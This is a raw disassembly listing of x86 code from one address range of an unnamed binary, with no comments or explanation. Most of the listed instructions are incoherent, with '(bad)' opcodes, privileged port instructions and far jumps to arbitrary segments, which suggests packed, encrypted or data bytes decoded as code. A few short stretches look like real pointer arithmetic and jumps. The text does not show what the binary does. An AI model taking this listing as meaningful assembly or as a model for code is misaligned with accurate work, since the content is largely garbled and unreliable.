  402f9b:	bound  ebp,QWORD PTR [edi]
  402f9d:	add    al,0x3a
  402f9f:	aaa    
  402fa0:	ja     0x402f7b
  402fa2:	inc    esp
  402fa3:	xchg   esi,eax
  402fa4:	lods   al,BYTE PTR ds:[esi]
  402fa5:	sbb    dh,ah
  402fa7:	sti    
  402fa8:	hlt    
  402fa9:	cmp    eax,0x926a952a
  402fae:	jp     0x402fbe
  402fb0:	xor    ecx,DWORD PTR [eax-0x11]
  402fb3:	jl     0x402fd5
  402fb5:	and    BYTE PTR [ebx+ebx*2-0x5b99d4af],ah
  402fbc:	out    dx,al
  402fbd:	push   eax
  402fbe:	rol    BYTE PTR [eax],1
  402fc0:	and    BYTE PTR [ebx],al
  402fc2:	add    eax,edi
  402fc4:	xor    ecx,ecx
  402fc6:	add    ecx,DWORD PTR ds:0x42a421
  402fcc:	mov    ecx,DWORD PTR [ecx]
  402fce:	add    DWORD PTR ds:0x42a2d9,ecx
  402fd4:	jmp    0x4034df
  402fd9:	cmp    al,0xc8
  402fdb:	rcl    ecx,0xd1
  402fde:	ror    esp,1
  402fe0:	int    0xcb
  402fe2:	sub    bh,al
  402fe4:	stos   BYTE PTR es:[edi],al
  402fe5:	(bad)  
  402fe7:	inc    ecx
  402fe8:	and    DWORD PTR [ebx+ebx*1+0x7c6a7878],ecx
  402fef:	js     0x403069
  402ff1:	std    
  402ff2:	xor    DWORD PTR [esi+0x5bb7c33b],edx
  402ff8:	gs pop esp
  402ffa:	push   esi
  402ffb:	int3   
  402ffc:	mov    al,ds:0x13802ed1
  403001:	adc    al,0xb5
  403003:	add    eax,0x5e9523c8
  403008:	addr16 ja 0x402fa8
  40300b:	pop    ds
  40300c:	mov    ebx,0x94cb050f
  403011:	mov    ds:0x8f06e80f,al
  403016:	adc    cl,dl
  403018:	test   DWORD PTR [eax+0x89f7c22],0xdacc5b19
  403022:	jecxz  0x402fe5
  403024:	lods   eax,DWORD PTR ds:[esi]
  403025:	jge    0x40304f
  403027:	push   0x29096f06
  40302c:	cmp    bh,dh
  40302e:	cmp    ebx,DWORD PTR [edx+0x50941003]
  403034:	mov    al,ds:0xc5b4cf60
  403039:	enter  0x1b88,0x9b
  40303d:	mov    bh,0x9f
  40303f:	ret    
  403040:	inc    edx
  403041:	or     BYTE PTR [ecx-0x4c],bh
  403044:	jmp    0xff85d2db
  403049:	cmp    al,0xff
  40304b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40304c:	add    ah,ah
  40304e:	gs cld 
  403050:	(bad)  
  403051:	xor    eax,0xfb227f24
  403056:	inc    ebx
  403057:	mov    bl,0xda
  403059:	cli    
  40305a:	ror    BYTE PTR [esi+0x46dd4149],1
  403060:	shr    DWORD PTR [ecx],1
  403062:	out    0xfe,eax
  403064:	shl    BYTE PTR [eax+0x5f83ffa8],cl
  40306a:	xchg   ebp,eax
  40306b:	ins    DWORD PTR es:[edi],dx
  40306c:	mov    al,0xa1
  40306e:	mov    ds:0xd6a8ed14,eax
  403073:	test   DWORD PTR [ebx],ebx
  403075:	in     al,dx
  403076:	dec    edi
  403077:	push   cs
  403078:	cmp    al,0x83
  40307a:	sub    ecx,DWORD PTR [esi-0xd]
  40307d:	repnz stc 
  40307f:	xchg   ebp,eax
  403080:	sub    eax,0x313abcc5
  403085:	or     ch,BYTE PTR [edx+edx*1+0x13e580ed]
  40308c:	add    ecx,edx
  40308e:	dec    esp
  40308f:	jmp    0x403041
  403091:	pop    ebx
  403092:	sbb    eax,DWORD PTR [ebx]
  403094:	in     al,dx
  403095:	pop    esp
  403096:	cli    
  403097:	leave  
  403098:	sbb    bl,BYTE PTR [edx+edi*2]
  40309b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40309c:	ficomp WORD PTR [edi+0x2b1d1071]
  4030a2:	xor    cl,BYTE PTR [eax]
  4030a4:	or     cl,BYTE PTR [ecx-0x59]
  4030a7:	dec    esi
  4030a8:	pop    eax
  4030a9:	loop   0x40302f
  4030ab:	cmp    DWORD PTR [ebx],esp
  4030ad:	mov    ch,0xb2
  4030af:	rol    DWORD PTR [eax],1
  4030b1:	cs cmc 
  4030b3:	hlt    
  4030b4:	push   ss
  4030b5:	fisttp QWORD PTR [edi-0x19a3868f]
  4030bb:	fisubr DWORD PTR [ecx]
  4030bd:	mov    ch,0xd2
  4030bf:	fs inc ebp
  4030c1:	repnz enter 0xdcdb,0x83
  4030c6:	popf   
  4030c7:	fs std 
  4030c9:	retf   
  4030ca:	mov    bl,0x47
  4030cc:	cdq    
  4030cd:	aaa    
  4030ce:	adc    al,0xc0
  4030d0:	xchg   ecx,eax
  4030d1:	mov    ds:0xe4092eee,al
  4030d6:	jo     0x4030bf
  4030d8:	sub    eax,edx
  4030da:	adc    al,BYTE PTR [esi+0x4ce8ffef]
  4030e0:	jb     0x403086
  4030e2:	rol    esp,cl
  4030e4:	jns    0x40315e
  4030e6:	out    dx,eax
  4030e7:	push   cs
  4030e8:	dec    eax
  4030e9:	sbb    ch,dl
  4030eb:	stos   DWORD PTR es:[edi],eax
  4030ec:	push   edx
  4030ed:	into   
  4030ee:	cmp    eax,0xe5ed1011
  4030f3:	(bad)  
  4030f4:	test   al,0xc0
  4030f6:	mov    fs,WORD PTR [eax]
  4030f8:	add    esi,DWORD PTR [ebp+0x6d]
  4030fb:	sbb    eax,0xd19a65b7
  403100:	sbb    eax,0x9a0caa35
  403105:	or     BYTE PTR [esi+eiz*2],al
  403108:	vpperm ymm3,ymm2,ymm1,YMMWORD PTR [esi-0x7e]
  40310f:	and    bl,BYTE PTR [edi]
  403111:	sbb    al,0x63
  403113:	pop    edi
  403114:	pop    esi
  403115:	push   esp
  403116:	retf   
  403117:	loope  0x403180
  403119:	adc    BYTE PTR [ecx],dl
  40311b:	jecxz  0x403177
  40311d:	fiadd  DWORD PTR [ebx-0x3b]
  403120:	mov    eax,ecx
  403122:	sbb    al,0x35
  403124:	neg    DWORD PTR [ebx+eax*2]
  403127:	sub    al,0x5a
  403129:	xor    DWORD PTR [eax],esi
  40312b:	adc    eax,0xb8b4330f
  403130:	pop    edx
  403131:	mov    al,ds:0xd1da5aa0
  403136:	(bad)
  403139:	mov    bl,0x6b
  40313b:	fs and al,0xb3
  40313e:	loop   0x403125
  403140:	in     eax,dx
  403141:	jge    0x403151
  403143:	sub    eax,0xdc045971
  403148:	add    DWORD PTR [eax-0x43dd51e0],ebx
  40314e:	les    ebp,FWORD PTR [edx+eax*1-0x2f9fa460]
  403155:	sub    DWORD PTR [ebp+edx*8+0x3ca67c1d],edi
  40315c:	cmc    
  40315d:	stos   DWORD PTR es:[edi],eax
  40315e:	inc    ebx
  40315f:	aad    0x56
  403161:	adc    esi,eax
  403163:	push   esp
  403164:	pop    esi
  403165:	cdq    
  403166:	jp     0x403164
  403168:	icebp  
  403169:	ds inc edx
  40316b:	or     bh,ch
  40316d:	cmc    
  40316e:	jmp    DWORD PTR [edi+0x2838cbed]
  403174:	inc    BYTE PTR [ebp-0x4f490f9f]
  40317a:	rcl    BYTE PTR [edx+0x17139bd0],0x8c
  403181:	mov    al,ds:0x8ba2dcf0
  403186:	inc    eax
  403187:	inc    esp
  403188:	adc    ebx,ebx
  40318a:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40318c:	ins    BYTE PTR es:[edi],dx
  40318d:	int3   
  40318e:	push   ecx
  40318f:	aas    
  403190:	ror    DWORD PTR ds:0xffa27c57,cl
  403196:	loopne 0x403121
  403198:	mov    edi,0x83026d72
  40319d:	call   0x153a:0x92a3f9a4
  4031a4:	adc    al,0xbc
  4031a6:	das    
  4031a7:	pop    es
  4031a8:	jle    0x4031b6
  4031aa:	lea    esi,[eax-0x60caf402]
  4031b0:	outs   dx,BYTE PTR ds:[esi]
  4031b1:	xor    esp,DWORD PTR [ebp-0x64]
  4031b4:	or     DWORD PTR [esi+0x488b22f4],ebx
  4031ba:	into   
  4031bb:	push   edx
  4031bc:	jmp    0x4031bd
  4031be:	inc    eax
  4031bf:	jnp    0x4031df
  4031c1:	pop    eax
  4031c2:	sub    esp,DWORD PTR [esi]
  4031c4:	cli    
  4031c5:	jo     0x403159
  4031c7:	xor    bh,BYTE PTR [esi+esi*8-0xe0d7bd3]
  4031ce:	xchg   esp,eax
  4031cf:	repz enter 0x4692,0xc3
  4031d4:	mov    edi,0xc56ba9c5
  4031d9:	adc    al,0xfc
  4031db:	in     al,0xda
  4031dd:	sub    BYTE PTR [edx+0x20],ah
  4031e0:	push   edx
  4031e1:	in     eax,0xb0
  4031e3:	and    edi,eax
  4031e5:	cdq    
  4031e6:	pop    ds
  4031e7:	add    esi,edi
  4031e9:	shr    DWORD PTR [eax],1
  4031eb:	jl     0x40322b
  4031ed:	scas   eax,DWORD PTR es:[edi]
  4031ee:	rcl    BYTE PTR [eax-0x71],1
  4031f1:	aam    0x57
  4031f3:	mov    ch,0x7f
  4031f5:	mov    ecx,0x78bcf51b
  4031fa:	cmp    al,BYTE PTR [ebx+0x13]
  4031fd:	cmp    eax,0x286d31b
  403202:	push   edi
  403203:	ret    0xeeb7
  403206:	and    eax,0x34d963fb
  40320b:	mov    bh,0xb4
  40320d:	pop    es
  40320e:	jne    0x403191
  403210:	mov    eax,0xa93b9537
  403215:	arpl   WORD PTR [esi],di
  403217:	es es imul bh
  40321b:	cwde   
  40321c:	jmp    0x675e:0x4d07260a
  403223:	(bad)  
  403224:	popa   
  403225:	in     eax,dx
  403226:	(bad)  [edi+0x7b840291]
  40322c:	retf   
  40322d:	sti    
  40322e:	jmp    0x8402:0xd1d920f8
  403235:	das    
  403236:	add    ecx,DWORD PTR [edx+0x73]
  403239:	test   BYTE PTR [ebx+0x7e35ec2],0x4e
  403240:	mov    edi,0x65e13e50
  403245:	adc    al,0xb4
  403247:	das    
  403248:	xchg   DWORD PTR [ecx],esp
  40324a:	fdivr  st(3),st
  40324c:	repnz pusha 
  40324e:	cmp    esi,edx
  403250:	cmp    esp,esi
  403252:	adc    ah,BYTE PTR [edi+0x4a]
  403255:	cli    
  403256:	mov    ds:0xa4504fe5,al
  40325b:	out    0xfa,al
  40325d:	ja     0x403292
  40325f:	xor    eax,0x9c3a03da
  403264:	das    
  403265:	rcr    ebp,cl
  403267:	mov    esi,0xca99c1f0
  40326c:	sbb    eax,edx
  40326e:	inc    edx
  40326f:	cmp    eax,0xbb8f7c64
  403274:	cs repnz stos BYTE PTR es:[edi],al
  403277:	or     edx,DWORD PTR [edx-0x7955a431]
  40327d:	fild   QWORD PTR [edi+ebp*8]
  403280:	xor    al,0x1d
  403282:	pop    ebx
  403283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403284:	das    
  403285:	lock scas eax,DWORD PTR es:[edi]
  403287:	pop    ecx
  403288:	repnz ss sti 
  40328b:	inc    esp
  40328c:	jge    0x4032c1
  40328e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40328f:	in     eax,0xa2
  403291:	add    cl,dh
  403293:	push   ecx
  403294:	dec    eax
  403295:	rcr    DWORD PTR [esp+ebx*8-0xae54f01],0x64
  40329d:	stc    
  40329e:	sub    DWORD PTR [edx+eiz*4+0x5ef9570],edi
  4032a5:	cwde   
  4032a6:	ror    BYTE PTR [edi-0x23],1
  4032a9:	mov    BYTE PTR [esi-0x549462cf],ah
  4032af:	mov    edx,0x98c6d5a6
  4032b4:	(bad)  [edx+0x34]
  4032b7:	mov    eax,0x16aa9d16
  4032bc:	shl    BYTE PTR [esi-0x1bbb9668],1
  4032c2:	adc    DWORD PTR [ebx-0x150880c4],0x19
  4032c9:	rol    eax,1
  4032cb:	jecxz  0x40332c
  4032cd:	dec    esp
  4032ce:	mov    eax,ds:0xfe4b7a79
  4032d3:	sub    al,0xab
  4032d5:	pop    esp
  4032d6:	out    dx,eax
  4032d7:	xchg   esi,eax
  4032d8:	cli    
  4032d9:	pushf  
  4032da:	sub    ecx,DWORD PTR [ecx]
  4032dc:	addr16 je 0x40333c
  4032df:	push   edi
  4032e0:	or     eax,0xaa082d77
  4032e5:	add    edi,DWORD PTR gs:[esi+0x62]
  4032e9:	jl     0x40326e
  4032eb:	pusha  
  4032ec:	push   ebx
  4032ed:	push   esi
  4032ee:	in     al,0xfe
  4032f0:	ret    0xc992
  4032f3:	jmp    0x6a73:0xf18cbec3
  4032fa:	mov    eax,edi
  4032fc:	pop    esp
  4032fd:	fnstsw WORD PTR [esi]
  4032ff:	sbb    DWORD PTR [ebx+0x7d],ebx
  403302:	inc    ebp
  403303:	test   eax,0x6c5f5435
  403308:	jle    0x403387
  40330a:	and    eax,0xc9db0c0
  40330f:	clc    
  403310:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403312:	xchg   ecx,eax
  403313:	jb     0xb7564c60
  403319:	mov    dh,BYTE PTR [edx-0x26]
  40331c:	jmp    0x7195:0xb58e5e54
  403323:	add    esp,esp
  403325:	ret    
  403326:	pop    edx
  403327:	pop    ebp
  403328:	pop    ebx
  403329:	fchs   
  40332b:	and    bl,dl
  40332d:	daa    
  40332e:	cld    
  40332f:	outs   dx,DWORD PTR ds:[esi]
  403330:	push   esp
  403331:	or     al,0x40
  403333:	bound  edx,QWORD PTR [ebp+0x35920cd2]
  403339:	push   ecx
  40333a:	dec    bp
  40333c:	mov    esp,0xf2834d69
  403341:	jge    0x4032d7
  403343:	and    al,0x26
  403345:	xchg   DWORD PTR fs:[ecx],edx
  403348:	in     eax,dx
  403349:	xchg   esp,eax
  40334a:	pop    ebx
  40334b:	sbb    BYTE PTR [ebx-0x35],dl
  40334e:	and    BYTE PTR [ecx+0x4f],bh
  403351:	pop    es
  403352:	jle    0x403337
  403354:	inc    esi
  403355:	xor    al,ch
  403357:	outs   dx,DWORD PTR ds:[esi]
  403358:	xor    BYTE PTR [edi],0xde
  40335b:	xchg   edx,eax
  40335c:	jo     0x40333d
  40335e:	xchg   ch,al
  403360:	aaa    
  403361:	jg     0x40335d
  403363:	test   BYTE PTR [ecx+edx*4],cl
  403366:	jb     0x4033af
  403368:	adc    al,0x7f
  40336a:	call   0x6a7c:0x4b3ed395
  403371:	fisub  WORD PTR [edx-0x276963d7]
  403377:	stc    
  403378:	sbb    edx,ebp
  40337a:	gs aad 0x7a
  40337d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40337e:	jmp    0x38fc:0x8ff33a5b
  403385:	jmp    0xc54:0xad84b347
  40338c:	push   0x1
  40338e:	mov    ds:0x29b9988,eax
  403393:	pusha  
  403394:	jbe    0x40333e
  403396:	cwde   
  403397:	aad    0x8
  403399:	add    ebx,ebp
  40339b:	push   edi
  40339c:	cmp    DWORD PTR [ecx-0x33b4be2c],ecx
  4033a2:	adc    BYTE PTR [ecx],bl
  4033a4:	push   edi
  4033a5:	cmp    ebx,DWORD PTR [ecx+0x44]
  4033a8:	add    dh,BYTE PTR [edx-0x30ba22ca]
  4033ae:	jg     0x4033c6
  4033b0:	push   cs
  4033b1:	arpl   ax,si
  4033b3:	mov    DWORD PTR [ebx],esi
  4033b5:	dec    ebx
  4033b6:	jmp    0x40334f
  4033b8:	rol    BYTE PTR [ebx],0x32
  4033bb:	es hlt 
  4033bd:	sbb    eax,0x4eea3656
  4033c2:	adc    eax,0x4a96697f
  4033c7:	shl    DWORD PTR [edx-0x31162a37],0xdb
  4033ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033cf:	cmp    DWORD PTR [ebx],esi
  4033d1:	ins    BYTE PTR es:[edi],dx
  4033d2:	jbe    0x403405
  4033d4:	fndisi(8087 only) 
  4033d6:	mov    bl,0xaf
  4033d8:	cmp    al,0x5f
  4033da:	inc    esp
  4033db:	jo     0x4033bf
  4033dd:	repz add ecx,DWORD PTR fs:[ecx-0x1f2f304a]
  4033e5:	pop    edi
  4033e6:	xor    eax,0x59da33c5
  4033eb:	dec    ebp
  4033ec:	cld    
  4033ed:	popa   
  4033ee:	retf   0x9350
  4033f1:	int    0x7
  4033f3:	int3   
  4033f4:	jl     0x4033b4
  4033f6:	adc    al,0x4
  4033f8:	mov    eax,0x2b8d6a0
  4033fd:	scas   eax,DWORD PTR es:[edi]
  4033fe:	sti    
  4033ff:	xor    ch,BYTE PTR [esi]
  403401:	loopne 0x4033ff
  403403:	in     al,dx
  403404:	sbb    eax,0xc67ab64e
  403409:	sub    BYTE PTR [esi],bh
  40340b:	in     al,dx
  40340c:	pusha  
  40340d:	outs   dx,BYTE PTR ds:[esi]
  40340e:	call   0xd9bbcd37
  403413:	fidiv  DWORD PTR [esp+edi*4-0x32b80f5]
  40341a:	or     dl,ch
  40341c:	jle    0x4033c6
  40341e:	call   0x15f6359b
  403423:	nop
  403424:	sbb    DWORD PTR [edi-0x26],0x60
  403428:	test   DWORD PTR [eax],eax
  40342a:	jge    0x403422
  40342c:	push   ebp
  40342d:	nop
  40342e:	arpl   WORD PTR [edx-0x5587fe1f],bp
  403434:	cmp    ebp,ebx
  403436:	imul   esp,DWORD PTR [ebx],0x19385965
  40343c:	xor    eax,0xefb4ad9c
  403441:	mov    al,dl
  403443:	and    bh,dh
  403445:	mov    eax,0x190fbf52
  40344a:	jge    0x4033cc
  40344c:	jno    0x403451
  40344e:	icebp  
  40344f:	lods   al,BYTE PTR ds:[esi]
  403450:	retf   
  403451:	add    ch,BYTE PTR [eax]
  403453:	push   ebp
  403454:	push   es
  403455:	inc    esi
  403456:	mov    ecx,0xfcf28194
  40345b:	mov    ch,0x76
  40345d:	out    0x3a,al
  40345f:	call   0xcfc:0xd6edd02f
  403466:	sub    BYTE PTR [edx],ah
  403468:	(bad)  
  403469:	pop    eax
  40346a:	push   0x64
  40346c:	xchg   ebp,eax
  40346d:	push   ebp
  40346e:	or     eax,DWORD PTR [eax+0x38dc4880]
  403474:	clc    
  403475:	push   edi
  403476:	mov    esp,0x12491d0f
  40347b:	adc    esi,DWORD PTR [eax]
  40347d:	inc    esi
  40347e:	in     al,0xb0
  403480:	ret    
  403481:	into   
  403482:	loopne 0x403425
  403484:	test   DWORD PTR [edi+eiz*2],esi
  403487:	sub    ebp,DWORD PTR [esi]
  403489:	sbb    edx,0xffffffa7
  40348c:	sahf   
  40348d:	inc    esi
  40348e:	data16 mov WORD PTR [ecx],fs
  403491:	push   cs
  403492:	jne    0x4034de
  403494:	jb     0x4034b3
  403496:	in     eax,dx
  403497:	push   edx
  403498:	push   0x48755795
  40349d:	popa   
  40349e:	add    BYTE PTR [eax-0x1fe552d],cl
  4034a4:	dec    edi
  4034a5:	test   eax,0xb8ff2321
  4034aa:	xlat   BYTE PTR ds:[ebx]
  4034ab:	out    dx,al
  4034ac:	cs pop ecx
  4034ae:	iret   
  4034af:	or     dl,ah
  4034b1:	pop    ebp
  4034b2:	xor    DWORD PTR [ebx],esi
  4034b4:	cld    
  4034b5:	inc    eax
  4034b6:	lods   al,BYTE PTR ds:[esi]
  4034b7:	push   ebp
  4034b8:	bound  esp,QWORD PTR ds:0xe1eb4eb8
  4034be:	ja     0x403455
  4034c0:	clc    
  4034c1:	shl    bh,1
  4034c3:	out    0x33,eax
  4034c5:	lock xor edi,ebx
  4034c8:	js     0x40345c
  4034ca:	add    al,0x38
  4034cc:	lds    esp,FWORD PTR [edi-0x7267c4a0]
  4034d2:	jge    0x40348d
  4034d4:	icebp  
  4034d5:	push   ss
  4034d6:	dec    ebp
  4034d7:	mul    DWORD PTR [ebx-0x4d]
  4034da:	jnp    0x403556
  4034dc:	sbb    ch,BYTE PTR [ebx]
  4034de:	and    DWORD PTR [ecx+0x45c7f445],ecx
  4034e4:	fdivr  DWORD PTR ds:0xa1f89c85
  4034ea:	stc    
  4034eb:	mov    ds:0x5330042,al
  4034f0:	jge    0x403495
  4034f2:	inc    edx
  4034f3:	add    BYTE PTR [ebx+0x42a2f9],ah
  4034f9:	mov    BYTE PTR [ebp-0x11],0x67
  4034fd:	and    DWORD PTR ds:0x42a3c9,edi
  403503:	jmp    0x403a0e
  403508:	ror    edi,cl
  40350a:	iret   
  40350b:	(bad)  
  40350c:	rol    esi,cl
  40350e:	(bad)  
  403510:	stos   BYTE PTR es:[edi],al
  403511:	adc    al,0xb1
  403513:	jb     0x403566
  403515:	sahf   
  403516:	pop    edx
  403517:	(bad)  
  403519:	push   ds
  40351a:	js     0x403594
  40351c:	push   0x7c
  40351e:	js     0x403598
  403520:	test   BYTE PTR [esi],dl
  403522:	dec    ebx
  403523:	fst    QWORD PTR [ebx]
  403525:	push   cs
  403526:	rcr    esi,cl
  403528:	pop    es
  403529:	and    DWORD PTR [eax+edx*1-0x1b21c1e3],0x59
  403531:	iret   
  403532:	mov    bl,0x91
  403534:	mov    ecx,0xe63c868b
  403539:	into   
  40353a:	inc    ecx
  40353b:	inc    eax
  40353c:	sbb    dh,0xfe
  40353f:	imul   DWORD PTR [eax-0x1]
  403542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403543:	ret    
  403544:	sbb    BYTE PTR [esi-0x2d10ce24],ah
  40354a:	xchg   esi,eax
  40354b:	ret    0xc917
  40354e:	addr16 mov esp,0x3ad75959
  403554:	das    
  403555:	push   esp
  403556:	frstor [edi+edi*1-0x4f]
  40355a:	or     bl,BYTE PTR [ebp-0x4b017cf6]
  403560:	popf   
  403561:	scas   eax,DWORD PTR es:[edi]
  403562:	sub    esp,0xffffffc0
  403565:	dec    eax
  403566:	in     al,0x4a
  403568:	sub    esi,DWORD PTR [edi+0x278c42af]
  40356e:	adc    ah,BYTE PTR [ebx+0x1461df1c]
  403574:	das    
  403575:	cwde   
  403576:	pusha  
  403577:	xchg   ebp,eax
  403578:	outs   dx,BYTE PTR ds:[esi]
  403579:	sub    al,0x90
  40357b:	mov    dh,0x20
  40357d:	cdq    
  40357e:	js     0x4035df
  403580:	aaa    
  403581:	push   eax
  403582:	pop    ebx
  403583:	imul   eax,DWORD PTR [edx-0x5f],0x28
  403587:	adc    DWORD PTR ds:0x13a3b3ed,edx
  40358d:	fmul   DWORD PTR [edx-0x2c]
  403590:	shl    DWORD PTR [ebp-0x4f],0x5b
  403594:	mov    al,0x42
  403596:	out    dx,eax
  403597:	int3   
  403598:	(bad)  
  403599:	loop   0x4035a7
  40359b:	sbb    eax,DWORD PTR [ebx]
  40359d:	cmc    
  40359e:	test   DWORD PTR [edx-0x6470347c],0xcd13f57
  4035a8:	cmc    
  4035a9:	mov    ch,BYTE PTR [esi*1+0x14c7628e]
  4035b0:	mov    gs,WORD PTR ds:0xfd3b80a1
  4035b6:	pushf  
  4035b7:	or     eax,0x5895177a
  4035bc:	call   0xfc135435
  4035c1:	call   0xf80d2408
  4035c6:	pop    ebx
  4035c7:	jbe    0x4035c0
  4035c9:	add    cl,al
  4035cb:	sbb    bl,BYTE PTR [ebp+0x54]
  4035ce:	lods   al,BYTE PTR ds:[esi]
  4035cf:	xchg   ecx,eax
  4035d0:	aam    0x68
  4035d2:	aas    
  4035d3:	fs sbb al,0x46
  4035d6:	inc    ebp
  4035d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035d8:	push   eax
  4035d9:	push   0xfffffff7
  4035db:	lods   al,BYTE PTR ds:[esi]
  4035dc:	idiv   DWORD PTR [edx+0x33e7733d]
  4035e2:	sub    BYTE PTR [ebx],dh
  4035e4:	cdq    
  4035e5:	out    dx,al
  4035e6:	out    0x40,al
  4035e8:	fcomp  QWORD PTR [eax]
  4035ea:	add    eax,0x77a5ce90
  4035ef:	popa   
  4035f0:	into   
  4035f1:	mov    ah,BYTE PTR [esi]
  4035f3:	jmp    0x3a4bb35d
  4035f8:	mov    edi,0x5283f4ab
  4035fd:	push   ebx
  4035fe:	aam    0xaf
  403600:	test   ebp,ecx
  403602:	in     al,dx
  403603:	pop    ebx
  403604:	mov    ebp,0x62cfa51
  403609:	adc    eax,0x1028ce3c
  40360e:	add    BYTE PTR [esi+0x2656db3a],0x95
  403615:	lods   eax,DWORD PTR ds:[esi]
  403616:	xor    eax,0x17b48249
  40361b:	ja     0x40368d
  40361d:	pop    ecx
  40361e:	sbb    DWORD PTR [edx+0x74],ebp
  403621:	data16 out 0x2,al
  403624:	mov    ebp,0xd86828d3
  403629:	dec    edx
  40362a:	loopne 0x4035dc
  40362c:	mov    ah,0x10
  40362e:	call   0x181c:0xd9e411ca
  403635:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403636:	repnz cmp al,0xc3
  403639:	or     edx,ebp
  40363b:	mov    ch,0x7b
  40363d:	jne    0x40361e
  40363f:	jae    0x40365e
  403641:	mov    ds:0x23a01817,al
  403646:	dec    ebp
  403647:	mov    ch,0xb9
  403649:	inc    esi
  40364a:	mov    ebx,0xb879d275
  40364f:	cld    
  403650:	rcl    cl,1
  403652:	jae    0x4035e8
  403654:	enter  0xc136,0x68
  403658:	push   ebp
  403659:	dec    ebx
  40365a:	arpl   WORD PTR [ecx],bp
  40365c:	sahf   
  40365d:	mov    ebx,0xbdefde9a
  403662:	es mov dl,0x20
  403665:	add    eax,0xff2a1bc9
  40366a:	arpl   WORD PTR [eax],cx
  40366c:	pop    es
  40366d:	jns    0x403601
  40366f:	aas    
  403670:	xchg   ecx,eax
  403671:	xchg   edx,eax
  403672:	or     al,0xfa
  403674:	call   0xedf8:0x398cc167
  40367b:	inc    eax
  40367c:	pop    ebp
  40367d:	jno    0x40365c
  40367f:	lock pop ecx
  403681:	add    al,0x3f
  403683:	jno    0x403655
  403685:	(bad)  
  403686:	xchg   edi,eax
  403687:	xchg   edx,eax
  403688:	fist   WORD PTR [ebp-0x74]
  40368b:	or     edi,DWORD PTR [eax+0x7cb37b50]
  403691:	dec    ebp
  403692:	leave  
  403693:	sti    
  403694:	and    al,0xd1
  403696:	mov    eax,ds:0xef292ed2
  40369b:	mov    eax,ds:0x9a2ccbb7
  4036a0:	pop    ecx
  4036a1:	into   
  4036a2:	fmul   st,st(0)
  4036a4:	not    eax
  4036a6:	ror    BYTE PTR fs:[ebp+0x17],0xd2
  4036ab:	(bad)  
  4036ac:	(bad)  
  4036ad:	cwde   
  4036ae:	outs   dx,BYTE PTR ds:[esi]
  4036af:	mov    ecx,0x1ffe142c
  4036b4:	aaa    
  4036b5:	lods   eax,DWORD PTR ds:[esi]
  4036b6:	dec    esi
  4036b7:	loopne 0x4036c7
  4036b9:	sbb    al,0x4
  4036bb:	ret    
  4036bc:	rcl    DWORD PTR [eax+0x2],0xf5
  4036c0:	dec    esp
  4036c1:	and    BYTE PTR [ebx-0xd],dl
  4036c4:	aad    0x15
  4036c6:	xor    bh,BYTE PTR [eax+0x22eb9270]
  4036cc:	data16 in al,0xdf
  4036cf:	mov    ebx,esp
  4036d1:	mov    ch,0x18
  4036d3:	mov    bh,0x54
  4036d5:	xor    eax,0x68451022
  4036da:	sub    eax,0xa756b1e1
  4036df:	jmp    0x4036af
  4036e1:	add    eax,0x4531bc18
  4036e6:	xlat   BYTE PTR ds:[ebx]
  4036e7:	das    
  4036e8:	outs   dx,BYTE PTR ds:[esi]
  4036e9:	mov    edi,0xe3dd0f09
  4036ee:	xor    BYTE PTR [ecx+0x6a],0xd5
  4036f2:	inc    edi
  4036f3:	mov    ds,WORD PTR [eax]
  4036f5:	inc    esi
  4036f6:	inc    ecx
  4036f7:	fcom   QWORD PTR [ecx]
  4036f9:	scas   eax,DWORD PTR es:[edi]
  4036fa:	mov    bl,0xe2
  4036fc:	(bad)  
  4036fd:	shr    DWORD PTR [ebx-0x1f],cl
  403700:	xlat   BYTE PTR ds:[ebx]
  403701:	fisubr WORD PTR [esp+edi*4+0x7]
  403705:	imul   esp
  403707:	jge    0x4036db
  403709:	cmp    eax,0xb40b8dcb
  40370e:	std    
  40370f:	and    eax,0x620fbb85
  403714:	or     cl,BYTE PTR [esi]
  403716:	das    
  403717:	(bad)  
  403718:	(bad)  
  403719:	stos   BYTE PTR es:[edi],al
  40371a:	inc    ecx
  40371b:	mov    bl,dh
  40371d:	std    
  40371e:	idiv   cl
  403720:	push   es
  403721:	push   ds
  403722:	fisttp DWORD PTR [ebx+0x48f9315d]
  403728:	mov    ebp,0x199ab81a
  40372d:	push   0xef9301b6
  403732:	inc    ebp
  403733:	cli    
  403734:	lock xor edi,DWORD PTR [eax+0x55b5921a]
  40373b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40373c:	jno    0x4036c4
  40373e:	sar    ah,1
  403740:	nop
  403741:	pop    edi
  403742:	add    BYTE PTR [ebp-0x4b0e76fa],bl
  403748:	and    eax,0x3ab6ca6e
  40374d:	sbb    edi,0x17
  403750:	add    ebx,DWORD PTR [ecx]
  403752:	sbb    bh,BYTE PTR [eax+0x7c]
  403755:	pop    ebp
  403756:	jo     0x40376c
  403758:	(bad)  
  403759:	popa   
  40375a:	loope  0x4036dc
  40375c:	inc    edi
  40375d:	je     0x40378a
  40375f:	mov    ds:0xe8b968a4,eax
  403764:	shl    BYTE PTR cs:[eax-0x9c50967],cl
  40376b:	loope  0x4037bf
  40376d:	imul   ebp,DWORD PTR [esi+0x58],0x67
  403771:	xor    bl,BYTE PTR ds:0xd941e28b
  403777:	cmp    eax,0x8b17b3ba
  40377c:	addr16 nop
  40377e:	xchg   ebx,eax
  40377f:	js     0x4037f8
  403781:	ror    DWORD PTR [eax],1
  403783:	sbb    DWORD PTR [edi-0x6ea7edbc],0xffffffbd
  40378a:	or     BYTE PTR [ecx-0x26],cl
  40378d:	dec    esp
  40378e:	lods   al,BYTE PTR ds:[esi]
  40378f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403790:	imul   eax,DWORD PTR [esi],0x2f
  403793:	mov    WORD PTR [esi-0x43195f2c],?
  403799:	jae    0x403773
